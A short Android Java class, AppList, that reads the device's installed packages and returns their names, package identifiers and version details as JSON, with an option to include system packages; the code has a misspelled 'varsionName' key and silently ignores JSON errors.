package com.behavioralanalysis.service;

import android.content.pm.PackageInfo;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.List;

public class AppList {
    public static JSONObject get(boolean getSystemPackages) {
        JSONObject result = new JSONObject();
        List<PackageInfo> packages = MainService.getContext().getPackageManager().getInstalledPackages(0);
        JSONArray apps = new JSONArray();

        for (int i = 0; i < packages.size(); i++)
        {
            PackageInfo packageInfo = packages.get(i);
            if (!getSystemPackages && packageInfo.versionName == null) {
                continue;
            }

            try {
                JSONObject info = new JSONObject();
                info.put("appName", packageInfo.applicationInfo.loadLabel(MainService.getContext().getPackageManager()).toString());
                info.put("packageName", packageInfo.packageName);
                info.put("varsionName", packageInfo.versionName);
                info.put("versionCode", packageInfo.versionCode);

                apps.put(info);
            } catch (JSONException ex) {
            }
        }

        try {
            result.put("apps", apps);
        } catch (JSONException ex) {
        }

        return result;
    }
}
